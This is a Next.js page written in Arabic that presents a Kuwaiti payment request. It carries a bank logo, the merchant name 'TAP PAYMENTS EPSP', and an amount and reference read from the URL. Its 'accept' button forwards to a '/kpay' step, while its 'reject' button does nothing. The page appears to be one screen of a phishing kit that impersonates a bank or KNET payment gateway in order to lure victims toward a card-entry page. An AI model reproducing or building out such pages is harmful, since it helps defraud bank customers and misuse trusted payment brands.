"use client";

import { Suspense } from "react";
import Image from "next/image";
import styles from "./page.module.css";
import gbk from "../../public/gbkar.png";
import Footer from "./Footer";
import { useRouter,useSearchParams } from "next/navigation";

function HomeContent() {
  const searchParams = useSearchParams();
  const price = searchParams.get("price");
const dateNow = new Date();

const options = {
  year: "numeric",
  month: "2-digit",
  day: "2-digit",
  hour: "2-digit",
  minute: "2-digit",
  hour12: false, 
};

const formattedDateTime = dateNow.toLocaleString( options);



  const router = useRouter()
  const refN =searchParams.get("refN")
  
  return (
    <div className={styles.page} dir="rtl">
      <Image src={gbk} width={220} alt="bgk"/>
      <main className={styles.main}>
        <div className={styles.paymentBox}>
        <div className={styles.boxbox}>
          <span className={styles.amountMain}>{price}</span>
          <div className={styles.amountBox}>
            <span className={styles.amountDecimal}>000.</span>
            <span className={styles.currency}>KWD</span>
          </div>
        </div>
        <div className={styles.names}>
          <p>مطلوب من قبل</p>
        <h5>TAP PAYMENTS EPSP</h5>
        </div>
        <div className={styles.infoss}>
          <p >تاريخ الدفع:</p>
          <p >{formattedDateTime}</p>
        </div>
        <div className={styles.infoss}>
          <p >المرجع:</p>
          <p >{refN}</p>
        </div>
        <div className={styles.infoss}>
          <p >وضع الدفع:</p>
          <p >1</p>
        </div>
        <div className={styles.infoss}>
          <p >تفاصيل الدفع:</p>
          <p >دفع فاتورة</p>
        </div>
          <div className={styles.detailsGrid}>
              <button className={styles.aseccuss}>رفض</button>
              <button className={styles.closes} onClick={()=>router.push(`/kpay?refN=${refN}&price=${price}`)}>قبول</button>
          </div>
        </div>
      </main>


    </div>
  );
}

export default function Home() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HomeContent />
    </Suspense>
  );
}
